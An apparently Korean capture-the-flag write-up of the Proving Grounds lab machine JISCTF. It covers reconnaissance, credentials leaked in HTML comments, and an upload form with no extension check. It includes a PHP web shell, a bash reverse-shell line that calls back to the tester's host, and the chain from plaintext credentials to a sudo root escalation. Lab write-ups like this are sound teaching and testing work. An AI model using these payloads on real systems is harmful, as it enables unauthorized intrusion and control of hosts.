---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/info-disclosure
  - tech/web/file-upload
  - tech/web/rce
  - tech/lin/sudo-abuse
type: machine
platform: pg
os: linux
ip: 192.168.103.25
ports: [22, 80]
services: [http, ssh]
status: solved
manual_tags: true
tech_count: 4
---

> [!info] 요약
> **JISCTF** · Proving Grounds Fundamental · Ubuntu 16.04.2 LTS(커널 4.4.0-72-generic, 호스트명 `Jordaninfosec-CTF01`)(`192.168.103.25`) · 플래그 2개
> 진입점: `robots.txt` 로 노출된 관리 경로 → `/admin_area/` HTML 주석에 박힌 `admin` 자격증명으로 세션 하이재킹 → 확장자 검사 없는 업로드 폼에 PHP 웹셸 → www-data RCE
> 권한상승: `/etc/mysql/conf.d/credentials.txt`(퍼미션 644)에서 `technawi` 평문 자격증명 확보 → SSH 로그인 → `sudo` 전권(`(ALL : ALL) ALL`) → root
> `local.txt` = `f399949261d4ca4cec067cf8bb25ce2e`(www-data 권한으로 열람 — 파일 소유자는 technawi, 퍼미션 755) · `proof.txt` = `655efae33255210d14d6632afc08c2e8`(root)
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.103.25

### Initial Access – robots.txt 가 드러낸 관리 경로의 HTML 주석 자격증명으로 세션을 하이재킹해 확장자 미검사 업로드로 PHP 웹셸을 실행하는 경로

**Vulnerability Explanation:**
- `robots.txt` 의 `Disallow` 항목 8개 중 루트(`/`)를 뺀 실제 경로 7개(`/backup`·`/admin`·`/admin_area`·`/r00t`·`/uploads`·`/uploaded_files`·`/flag`)를 그대로 목록화 — `Disallow` 지시가 되레 공격 대상 지도로 작동
- `/admin_area/` 렌더 화면에는 정보가 없으나 HTML 주석에 `admin`/`3v1l_H@ck3r` 평문 자격증명이 그대로 게재
- `check_login.php` 가 별도 DB 없이 `$username==="admin" && $password==="3v1l_H@ck3r"` 하드코딩 문자열 비교로 인증을 처리 — 자격증명만 확보하면 추가 우회 불요
- `index.php` 의 업로드 처리부가 `$file_size` 만 검사하고 `$file_ext`(`strtolower(end(explode('.',...)))`)는 계산만 해두고 어디에도 미사용 — 확장자 제한 자체가 부재

**Vulnerability Fix:**
- 클라이언트로 전달되는 HTML 소스에 자격증명·내부 정보를 주석 형태로도 남기지 말 것 — 서버측 렌더링 단계에서 완전히 제거
- `robots.txt` 에 민감 경로를 나열하지 말고 서버측 인증·접근 제어로 차단
- 업로드 파일의 확장자·MIME·매직바이트를 화이트리스트로 검사하고, 업로드 디렉터리는 스크립트 실행 권한을 제거하거나 웹 루트 밖에 둘 것

**Severity:** Critical — 인증 없는 원격 사용자가 자격증명을 확보해 임의 PHP 코드 실행(RCE)까지 도달

**Steps to reproduce the attack:**
1. `robots.txt` 가 노출한 실제 경로 7개를 슬래시 유무 2벌씩 14회 배치 확인
2. `Service Enumeration` 절에서 확인한 `/admin_area/` HTML 주석에서 `admin` 자격증명 확인
3. `check_login.php` 로 세션 쿠키 획득
4. 인증된 세션으로 업로드 폼에 PHP 웹셸 업로드(확장자 4종 배치 시도로 필터 부재 확인)
5. `/uploaded_files/<파일명>` 요청으로 웹셸 실행 → www-data 셸 획득

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.103.25 | TCP: 22, 80 |

```bash
nmap --privileged -sCV -p- -Pn -n -A --min-rate 5000 -oN /home/kali/PG/JISCTF/nmap-full.txt 192.168.103.25
```

```text
# Nmap 7.98 scan initiated Wed Sep  9 11:05:11 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -n -A --min-rate 5000 -oN /home/kali/PG/JISCTF/nmap-full.txt 192.168.103.25
Nmap scan report for 192.168.103.25
Host is up (0.087s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 af:b9:68:38:77:7c:40:f6:bf:98:09:ff:d9:5f:73:ec (RSA)
|   256 b9:df:60:1e:6d:6f:d7:f6:24:fd:ae:f8:e3:cf:16:ac (ECDSA)
|_  256 78:5a:95:bb:d5:bf:ad:cf:b2:f5:0f:c0:0c:af:f7:76 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-title: Sign-Up/Login Form
|_Requested resource was login.php
| http-robots.txt: 8 disallowed entries 
| / /backup /admin /admin_area /r00t /uploads 
|_/uploaded_files /flag
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11, Linux 3.13 - 4.4
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep  9 11:05:42 2026 -- 1 IP address (1 host up) scanned in 30.60 seconds
```
— 출처: `~/PG/JISCTF/nmap-full.txt`

`-p-` 전체 스캔(30.6초)도 22·80 만 반환. 선행 top-1000 포트 스캔(`nmap-quick-ports.txt`, 0.72초)·서비스 스캔(`nmap-quick.txt`, `-p 22,80`)과 동일 — 고포트에 추가 서비스 부재.

UDP top-100(`nmap-udp-top100.txt`)은 응답한 9개 전부 `closed`, 나머지 91개는 무응답 — UDP 벡터는 해당 없음.

버전·역할 판정 근거:
- SSH — nmap 배너(`OpenSSH 7.2p2 Ubuntu 4ubuntu2.1`)와 셸 획득 후 `/etc/os-release`(`Ubuntu 16.04.2 LTS`)·`uname -a`(`4.4.0-72-generic`)가 독립적으로 일치 → 확정
- Apache — nmap 배너(`Apache httpd 2.4.18 (Ubuntu)`)와 404 페이지 푸터(`Apache/2.4.18 (Ubuntu) Server at 192.168.103.25 Port 80`)가 독립적으로 일치 → 확정

![[PG-JISCTF-login.png]]
*그림 1 — `login.php` 렌더 화면. nmap `http-title: Sign-Up/Login Form` 과 일치하며, 자격증명 확보 전까지는 이 폼을 거치는 것이 유일한 진입처럼 보였다*

`robots.txt` 의 `Disallow` 항목 8개 — 루트(`/`)를 뺀 실제 경로 7개를 그대로 노출:

```text
User-agent: *
Disallow: /
Disallow: /backup
Disallow: /admin
Disallow: /admin_area
Disallow: /r00t
Disallow: /uploads
Disallow: /uploaded_files
Disallow: /flag
```
— 출처: `~/PG/JISCTF/web-80/probe_robots.txt`

![[PG-JISCTF-robots.png]]
*그림 2 — `robots.txt` 원문. `Disallow` 항목 8개가 실제 애플리케이션 경로를 그대로 드러냄*

실제 경로 7개를 슬래시 유무 2벌씩 14회 한 번에 배치 요청(응답 원문은 `robots/*.body` 14개에 404 포함 전량 보존).

살아 있던 것은 3개뿐 — `/admin_area/`(200, HTML 주석에 자격증명)·`/uploaded_files/`(200, 0바이트 — 디렉터리 리스팅 비활성이나 존재 확인)·`/flag/`(200, `Your flag is in another file...` 낚시).

나머지 `/backup`·`/admin`·`/r00t`·`/uploads` 는 404 확인으로 배제: 

```text
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /backup/ was not found on this server.</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at 192.168.103.25 Port 80</address>
</body></html>
```
— 출처: `~/PG/JISCTF/robots/backup.body`

![[PG-JISCTF-apache-version-404.png]]
*그림 3 — `/backup/` 404 응답. 푸터의 `Apache/2.4.18 (Ubuntu)` 가 nmap 배너와 별개로 버전을 재확인시키는 두 번째 근거*

병렬로 돈 gobuster(`raft-small-words.txt`, `-x php,txt,html,bak,zip,old`, `-b 404,403`, tmux `rc-JISCTF-gb`)는 13행을 반환.

이 중 `admin_area`·`uploaded_files`·`flag`·`robots.txt` 는 `robots.txt` 가 이미 준 것. 새로 나온 것은 `hint.txt`·`check_login.php`·`login.php`·`index.php`·`logout.php`·`js`·`css`·`assets`:

```text
/login.php            (Status: 200) [Size: 1485]
/js                   (Status: 301) [Size: 313] [--> http://192.168.103.25/js/]
/index.php            (Status: 302) [Size: 1228] [--> login.php]
/css                  (Status: 301) [Size: 314] [--> http://192.168.103.25/css/]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/assets               (Status: 301) [Size: 317] [--> http://192.168.103.25/assets/]
/.                    (Status: 302) [Size: 1228] [--> login.php]
/robots.txt           (Status: 200) [Size: 160]
/flag                 (Status: 301) [Size: 315] [--> http://192.168.103.25/flag/]
/uploaded_files       (Status: 301) [Size: 325] [--> http://192.168.103.25/uploaded_files/]
/admin_area           (Status: 301) [Size: 321] [--> http://192.168.103.25/admin_area/]
/hint.txt             (Status: 200) [Size: 131]
/check_login.php      (Status: 200) [Size: 75]
```
— 출처: `~/PG/JISCTF/gobuster-80.txt`

다만 이 목록이 파일로 떨어진 것은 root 획득 이후다 — `gobuster-80.txt` 기록 시각 11:13:43 대 `proof_root.txt` 11:10:12(둘 다 Kali 로컬시각).

실제 공략에 쓰인 진입 지도는 `robots.txt` 하나. `/hint.txt` 도 gobuster 가 아니라 권한상승 단계의 `grep -rl technawi`(11:09:08)가 먼저 집었다 — gobuster 는 사후 대조용.

### Initial Access – 자격증명 세션 하이재킹 후 PHP 웹셸 업로드로 얻은 www-data RCE

<이 경로의 일반 절차(HTML 주석 자격증명 노출 패턴)는 [[_PLAYBOOK]] 참조. 이 절은 이 박스의 실제 재현>

`/admin_area/` 를 요청해 렌더된 화면을 확인 — 화면 자체에는 아무 값이 없다. 자격증명은 HTML **주석**에 있어 화면 캡처로는 드러나지 않는다:

```html
<html>
<head>
<title>
Fake admin area :)
</title>
<body>
<center><h1>The admin area not work :) </h1></center>
<!--	username : admin
	password : 3v1l_H@ck3r
	Your flag is in another file...
-->
</body>
</html>
```
— 출처: `~/PG/JISCTF/robots/admin_area.body`

![[PG-JISCTF-admin_area.png]]
*그림 4 — `/admin_area/` 렌더 화면. 위 코드펜스의 자격증명은 HTML 주석이라 이 화면에는 보이지 않는다 — view-source 나 원문 응답 확인이 필요*

`view-source:` 스킴은 헤드리스 크로미움이 열지 못해 새 탭(검색창)이 찍혔고, 그 파일은 증거에서 폐기. 주석 안의 값은 화면이 아니라 `curl` 응답 본문에만 남는다.

위 주석의 `admin` / `3v1l_H@ck3r` 을 `check_login.php` 에 POST 해 세션 쿠키 획득. 로그인 요청의 curl 명령 줄과 HTTP 응답 헤더는 원문 미보존이고, 남은 실측은 쿠키잼 하나:

```text
# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.

192.168.103.25	FALSE	/	FALSE	0	PHPSESSID	t1u2gvfbt9kkqdna04qhmit0h0
```
— 출처: `~/PG/JISCTF/cj.txt`(curl 쿠키잼 원문). `PHPSESSID` 가 기록됐다는 것이 `check_login.php` 가 `Set-Cookie` 를 돌려준 근거

`check_login.php` 소스로 인증 로직을 확인 — DB 접속 없이 문자열을 그대로 비교:

```php
<?php
session_start();
$username = $_POST["user_name"];
$password = $_POST["pass_word"];
if($username ==="admin" && $password==="3v1l_H@ck3r")
{
	$_SESSION['loggedin']=true;
	header("Location: index.php");	
}
else
{
	echo "<br/><h1 style='color:red'><center>Error in username/password</center></h1>";
}
?>
```
— 출처: `~/PG/JISCTF/creds_and_src.txt`(`===CHECKLOGIN===` 구간)

인증된 세션으로 업로드 화면을 확인(쿠키 주입이 필요해 chromium 헤드리스 대신 `cutycapt --header='Cookie:PHPSESSID=...'` 사용, `QT_QPA_PLATFORM=offscreen` 필요 — 지정하지 않으면 `could not connect to display` 로 종료):

![[PG-JISCTF-upload-center-authenticated.png]]
*그림 5 — 인증된 세션으로 확인한 업로드 폼. 로그인 없이 `/` 를 요청해도 302 응답 본문에 같은 HTML 이 이미 포함돼 있었다(`index.php` 가 `header()` 뒤 `die()` 를 호출하지 않아 미인증 상태에서도 소스가 누출. 실제 파일 업로드 자체는 이 세션으로만 진행)*

`index.php` 소스로 업로드 처리 로직을 확인 — 파일 크기만 검사하고 확장자는 계산만 해둔 채 미사용:

```php
<?php
   if(isset($_FILES['image'])){
      $errors= array();
      $file_name = $_FILES['image']['name'];
      $file_size =$_FILES['image']['size'];
      $file_tmp =$_FILES['image']['tmp_name'];
      $file_type=$_FILES['image']['type'];
      $file_ext=strtolower(end(explode('.',$_FILES['image']['name'])));
      
      if($file_size > 2097152){
         $errors[]='File size must be excately 2 MB';
      }
      
      if(empty($errors)==true){
         move_uploaded_file($file_tmp,"uploaded_files/".$file_name);
         echo "Success";
      }else{
         print_r($errors);
      }
   }
?>
```
— 출처: `~/PG/JISCTF/creds_and_src.txt`(`===INDEXPHP===` 구간)

필터가 있을지 몰라 확장자 4종(`sh.php`·`sh.phtml`·`sh.php5`·`sh.jpg.php`, 전부 `<?php system($_REQUEST["c"]); ?>` 32바이트)을 한 번에 배치 업로드 — 4개 전부 `Success` 로 저장:

```php
<?php system($_REQUEST["c"]); ?>
```
— 출처: `~/PG/JISCTF/sh.php`(4개 웹셸 전부 동일 내용)

```text

Success
<!DOCTYPE html>
```
— 출처: `~/PG/JISCTF/up_sh.php.body`·`up_sh.phtml.body`·`up_sh.php5.body`·`up_sh.jpg.php.body`(4개 전부 1235바이트 동일). 선두 빈 줄은 `index.php` 출력 그대로. 이하 Upload Center 페이지 재출력분은 펜스에서 생략

업로드 성공 4/4 는 위 응답 원문이 근거. 실행 성공은 `sh.php` 에 한해 리버스셸 연결(`shell443.log`)과 그림 6 으로 실측.

나머지 3개의 실행 응답은 원문 미보존 — 근거는 `writeup_notes.txt` 기재(4개 전부 `uid=33(www-data)` 반환). 어느 쪽이든 `index.php` 소스의 확장자 검사 부재와 일치해 우회 연구는 불요.

`sh.php?c=` 로 리버스셸 페이로드(`bash -c "bash -i >& /dev/tcp/192.168.45.247/443 0>&1" &`, 끝의 `&` 로 백그라운드화해 `curl -m 8` 이 웹셸 요청에 붙잡히지 않게 함)를 전달해 www-data 셸을 획득 — 이 요청의 curl 명령 줄 원문은 미보존이나, 결과 연결은 리스너 로그로 실측:

```bash
listening on [any] 443 ...
connect to [192.168.45.247] from (UNKNOWN) [192.168.103.25] 51512
bash: cannot set terminal process group (1238): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Jordaninfosec-CTF01:/var/www/html/uploaded_files$ export TERM=xterm; id; hostname
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Jordaninfosec-CTF01
```
— 출처: `~/PG/JISCTF/shell443.log`(`www-data@Jordaninfosec-CTF01` 프롬프트 포함 — 대화형 셸에서 실측)

`no job control` 다음의 `python3 -c "import pty;pty.spawn(...)"` 승격 줄은 터미널 줄바꿈 제어문자가 섞여 펜스에서 생략. 대화형 승격은 같은 세션에서 완료.

![[PG-JISCTF-webshell-rce.png]]
*그림 6 — 웹셸 응답 화면. `uid=33(www-data)`·`/var/www/html/uploaded_files`·`uname -a`(`4.4.0-72-generic`)·`/home/technawi` 목록이 한 화면에 공존. 대량 텍스트 회수용이며 플래그 판독에는 미사용*

셸 획득 즉시 harvest.sh 를 실행하되, 결과 회수는 대화형 셸의 `cat` 대신 웹셸로 `/tmp/.h/harvest.txt` 를 직접 GET — tmux 캡처보다 990줄 전량을 깨끗하게 받는다:

```text
===== SUDO =====
sudo: a password is required
(sudo -n 실패 — 비밀번호 필요)
```
— 출처: `~/PG/JISCTF/harvest_wwwdata.txt` 26~28행

```text
===== FLAGS =====
--- /var/www/html/flag.txt
-rw-r----- 1 technawi technawi 32 Jul 13  2020 /var/www/html/flag.txt
--- /home/technawi/local.txt
-rwxr-xr-x 1 technawi technawi 33 Sep  9 05:02 /home/technawi/local.txt
f399949261d4ca4cec067cf8bb25ce2e
```
— 출처: `~/PG/JISCTF/harvest_wwwdata.txt` 985~990행. `/var/www/html/flag.txt` 는 stat 줄만 있고 내용이 없다 — 640 이라 www-data 가 못 읽는다. `/home/technawi/local.txt` 는 755 라 값까지 그대로 딸려 나온다

위 `f399949261d4ca4cec067cf8bb25ce2e` 는 harvest 회수분이다 — 채점용 열람은 아래 대화형 pty 세션이 별도로 수행한다.

같은 파일의 SUID·SGID·capabilities·cron 절은 Ubuntu 16.04 배포판 표준 목록과 일치해 권한상승 재료 부재.

로컬 플래그는 대화형 pty 세션에서 원위치로 열람:

```bash
clear; whoami; id; hostname; hostname -I; date; cat /home/technawi/local.txt
```
— 출처: `~/PG/JISCTF/creds_and_src.txt`(`===BH===` 구간, www-data 의 `.bash_history` 에 그대로 기록)

```bash
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Jordaninfosec-CTF01
192.168.103.25
Wed Sep  9 05:08:48 EEST 2026
f399949261d4ca4cec067cf8bb25ce2e
www-data@Jordaninfosec-CTF01:/tmp$
```
— 출처: `~/PG/JISCTF/proof_user.txt`(`www-data@Jordaninfosec-CTF01:/tmp$` 프롬프트 포함 — 대화형 셸에서 원위치로 읽은 실측)

터미널 캡처라 별도 그림 없음 — 채점 3요건(플래그 값·`hostname -I` 의 타깃 IP·`id` 권한)이 위 한 화면에 공존. 인스턴스 정지로 재촬영 불가.

**Local.txt value:**

```text
f399949261d4ca4cec067cf8bb25ce2e
```

읽은 사용자는 `technawi` 가 아니라 `www-data` — 파일 퍼미션이 755 라 가능했고, 이 박스가 의도한 경로다.

**수동 대안** — 디렉터리 브루트포스 도구 없이도 같은 진입에 닿는다.

- `robots.txt` 를 브라우저로 열어 `Disallow` 목록 확인 → `/admin_area/` 에서 소스 보기(Ctrl+U)로 주석의 자격증명 확인. 이 박스에서 실제로 경로를 연 것도 gobuster 가 아니라 `robots.txt` 였다
- 업로드 필터 판정은 `curl -F 'image=@sh.php'` 한 번과 `/uploaded_files/sh.php?c=id` 요청 한 번으로 대체

### Privilege Escalation – technawi 평문 자격증명 재사용과 sudo 전권으로 root 획득

**Vulnerability Explanation:**
- MySQL 설정 디렉터리(`/etc/mysql/conf.d/`) 안의 `credentials.txt` 가 `technawi` 소유임에도 퍼미션 **644** 라 www-data 를 포함한 모든 로컬 사용자가 읽을 수 있고, 그 안에 `technawi` 계정의 SSH 비밀번호가 평문으로 기재
- `technawi` 가 `sudo` 그룹 소속이라 로그인 즉시 비밀번호 재입력만으로 전체 권한(`(ALL : ALL) ALL`) 사용 가능 — 별도 SUID·크론·capability 경로 불요

**Vulnerability Fix:**
- 애플리케이션·서비스 설정 파일에 평문 비밀번호를 두지 말 것 — 최소한 퍼미션을 `600`(소유자 전용)으로 제한
- 일반 계정을 `sudo` 그룹에 무제한(`ALL:ALL`)으로 넣지 말고, 필요한 명령만 명시적으로 허용
- SSH 비밀번호와 다른 용도의 비밀번호를 재사용하지 말 것 — 이 박스는 SSH 로그인과 설정 파일 자격증명이 동일

**Severity:** High — 로컬 파일 읽기 권한 하나로 다른 계정 탈취와 완전한 권한상승이 동시에 성립

**Steps to reproduce the attack:**
1. `grep -rl technawi /etc /var/www /opt /srv` 로 `technawi` 를 언급하는 파일 일괄 검색
2. `/etc/mysql/conf.d/credentials.txt` 에서 평문 비밀번호 확인
3. SSH 로 `technawi` 로그인
4. `sudo -s` 로 root 셸 획득

`technawi` 사용자명을 아는 상태에서 관련 파일을 광범위 grep 으로 한 번에 탐색:

```bash
grep -rl technawi /etc /var/www /opt /srv
```

```text
/etc/subgid
/etc/mysql/conf.d/credentials.txt
/etc/subuid
/etc/passwd
/etc/group
/var/www/.bash_history
/var/www/html/index.php
/var/www/html/hint.txt
```
— 출처: `~/PG/JISCTF/find_technawi.txt`. 첫 시도는 `/usr/share` 까지 포함하고 GET 으로 요청해 응답이 빈 채 끊겼고, 원인은 방화벽이 아니라 grep 범위가 넓어 오래 걸린 것과 요청 방식(URL 길이) — 범위를 좁히고 POST + 타임아웃 120 초로 바꾸자 즉시 반환

`/var/www/html/hint.txt` 는 "숨김 파일"을 가리키는 오도성 힌트였고, 실제 자격증명은 `/etc/mysql/conf.d/` 안의 일반 파일에 있었다:

```text
try to find user technawi password to read the flag.txt file, you can find it in a hidden file ;)

Your flag is in another file...
```
— 출처: `~/PG/JISCTF/creds_and_src.txt`(`===HINT===` 구간)

```text
-rw-r--r-- 1 technawi technawi   75 Jul 13  2020 credentials.txt
```
— 출처: `~/PG/JISCTF/find_technawi.txt`(`/etc/mysql/conf.d/` 디렉터리 목록, 퍼미션 644)

```text
Your flag is in another file...

username : technawi
password : 3vilH@ksor
```
— 출처: `~/PG/JISCTF/creds_and_src.txt`(`===CRED===` 구간, `credentials.txt` 원문)

SSH 로 `technawi` 로그인 후 `sudo -s` 로 root 전환 — 이 세션 자체는 tmux 대화형 SSH 로 진행돼 명령 줄·`sudo -l` 출력의 원문 캡처는 미보존이다.

`~/PG/JISCTF/writeup_notes.txt` 기재 값은 남아 있다 — `sudo -l` → `(ALL : ALL) ALL`, `id` 그룹 목록에 `sudo`·`lxd` 존재.

그림 6 의 `/home/technawi` 목록에 찍힌 `.sudo_as_admin_successful` 이 이 기재의 독립 근거다.

이 마커는 Debian 계열 sudoers 플러그인이 `sudo` 그룹 사용자의 «성공한» 첫 sudo 뒤에 생성한다 — 문자열 `~/.sudo_as_admin_successful` 이 `/usr/libexec/sudo/sudoers.so` 안에 존재.

`lxd` 그룹 경로는 배제가 아니라 미시도 — `sudo` 가 더 짧아 가지 않았다.

root 로 재실행한 `harvest.sh` 의 프로세스 트리가 이 경로를 독립적으로 뒷받침한다:

```text
root      5190  0.0  0.3  65512  3572 ?        Ss   05:08   0:00 /usr/sbin/sshd -D
root     29979  0.0  0.6  92832  6824 ?        Ss   05:09   0:00  \_ sshd: technawi [priv]
technawi 32185  0.0  0.3  92832  3420 ?        S    05:09   0:00      \_ sshd: technawi@pts/0
technawi 32205  0.0  0.5  22600  5148 pts/0    Ss   05:09   0:00          \_ -bash
root      9516  0.0  0.3  52704  3808 pts/0    S    05:09   0:00              \_ sudo -s
root      9517  0.0  0.5  22480  5160 pts/0    S    05:09   0:00                  \_ /bin/bash
root      9551  0.0  0.1   4504  1720 pts/0    S+   05:10   0:00                      \_ sh /tmp/h.sh
root      9584  0.0  0.3  37508  3444 pts/0    R+   05:11   0:00                          \_ ps auxf
```
— 출처: `~/PG/JISCTF/harvest_root.txt`(`ps auxf` 절). `technawi` 소유 `-bash`(pts/0) 의 자식이 `sudo -s`, 그 자식이 root `/bin/bash` — SSH 대화형 세션에서 `sudo -s` 로 전환한 인과가 프로세스 계보로 실측

같은 파일의 환경변수 절도 이 경로를 뒷받침:

```text
HOME=/home/technawi
SUDO_USER=technawi
PWD=/home/technawi
```
— 출처: `~/PG/JISCTF/harvest_root.txt`(`ENV` 절). `SUDO_USER=technawi` 는 root 셸이 `su` 가 아니라 `sudo` 로 얻어졌다는 근거

**수동 대안** — 전역 `grep` 이 느리거나 막히는 경우.

- `hint.txt` 가 가리키는 닷파일을 뒤지는 대신 서비스 설정 디렉터리를 직접 열거(`ls -laR /etc/mysql /etc/apache2 /var/www`)
- 이 박스의 `credentials.txt` 는 `/etc/mysql/conf.d/` 의 «일반» 파일이라 그 목록에 바로 걸린다
- 이 형태는 미시도 — 실제로는 `grep -rl technawi` 가 한 번에 통했다

그림 없음 — 이 단계는 SSH pty 세션에서 진행돼 GUI 화면이 존재하지 않는다. 대체 증거는 위 프로세스 트리·환경변수와 `proof_root.txt`.

### Post-Exploitation

root 획득 직후 root 로 harvest.sh 재실행(`harvest_root.txt`, 1059줄)과 최종 플래그를 같은 대화형 세션에서 원위치로 열람:

```bash
whoami; id; hostname; hostname -I; date; cat /root/proof.txt
```
— 명령 줄 원문 미보존. SSH 대화형 세션에서 실행했고 출력 순서가 위 명령과 일치

```bash
root
uid=0(root) gid=0(root) groups=0(root)
Jordaninfosec-CTF01
192.168.103.25
Wed Sep  9 05:10:09 EEST 2026
655efae33255210d14d6632afc08c2e8
root@Jordaninfosec-CTF01:~#
```
— 출처: `~/PG/JISCTF/proof_root.txt`(`root@Jordaninfosec-CTF01:~#` 프롬프트 포함 — 대화형 셸에서 실측)

터미널 캡처라 별도 그림 없음 — 채점 3요건(플래그 값·`hostname -I` 의 타깃 IP·`id` 권한)이 위 한 화면에 공존. 인스턴스 정지로 재촬영 불가.

**Proof.txt value:**
`655efae33255210d14d6632afc08c2e8`

- 획득 권한 — `root`
- `/var/www/html/flag.txt`(소유자 `technawi:technawi`·퍼미션 640, root 로 재확인해도 동일)는 채점 플래그가 아닌 낚시 — 내용이 시종일관 `Your flag is in another file...` 하나뿐
- `/admin_area/` 주석·`/flag/` 응답·`credentials.txt` 도 같은 문구를 반복하는 동일 계열의 유도 문구
- 이 박스의 채점 플래그는 `local.txt`·`proof.txt` 둘(포털 완료 2/2)

**남긴 흔적** — 되돌리지 않은 변경. 랩 인스턴스는 이미 정지돼 원복 불가

| 종류 | 대상 | 내용 | 복구 여부 |
|---|---|---|---|
| 업로드 파일 | `/var/www/html/uploaded_files/{sh.php, sh.phtml, sh.php5, sh.jpg.php}` | `system($_REQUEST["c"])` 웹셸 4개 | 잔존 |
| 업로드 파일 | `/tmp/h.sh`·`/tmp/.h/harvest.txt` | 열거 스크립트 사본(마지막 실행은 root 소유) | 잔존 |
| 로컬 환경 | `/var/www/.bash_history` | www-data 로 실행한 명령 3줄이 그대로 기록 | 잔존 |
| 계정 | — | 변경 없음 | 해당 없음 |
| 설정 변경 | — | 변경 없음 | 해당 없음 |

- 이 세션의 LHOST — `192.168.45.247`(VPN 재접속마다 변동)
- Kali 쪽 tmux(`jisctf-lsnr`·`jisctf-http`·`jisctf-ssh`·`rc-JISCTF-full`·`rc-JISCTF-gb`)는 전부 세션 이름으로 종료, `pkill` 미사용. 8099 포트 HTTP 서버도 함께 종료. 별도로 만든 마운트 없음

## 관련

- [[_PLAYBOOK]] — HTML 주석에 박힌 자격증명 노출 패턴, 확장자 미검사 업로드, `sudo` 전권 오설정의 일반 절차·시행착오·시험 관점 소재지
- 산출물 — `~/PG/JISCTF/` 전량(nmap·gobuster·`robots/*.body` 14개·harvest 2종·웹셸 4개·`up_sh.*.body`·`shell443.log`·`proof_*.txt`). 볼트 반입분은 `파일보관\PG-JISCTF-*.png` 6장
- 원문 미보존 항목
  - `check_login.php` 로그인 요청과 웹셸 트리거 요청의 curl 명령 줄 — 결과(쿠키·리버스셸 연결)는 각각 `cj.txt`·`shell443.log` 로 실측, 요청 자체의 원문은 부재
  - `technawi` SSH 세션 내 `sudo -l`·`id` 의 터미널 캡처 — `writeup_notes.txt` 기재 값(`(ALL : ALL) ALL`, 그룹에 `sudo`·`lxd`)은 남아 있으나 원본 화면은 미보존. 대체 근거는 `harvest_root.txt` 의 프로세스 트리·환경변수
- **"HTML 주석에 박힌 자격증명"** 패턴 — 이 노트(`/admin_area/`), [[_PLAYBOOK]]
- **"설정 디렉터리 안 평문 자격증명 파일의 과다 퍼미션"** 패턴 — 이 노트(`/etc/mysql/conf.d/credentials.txt` 644), [[_PLAYBOOK]]
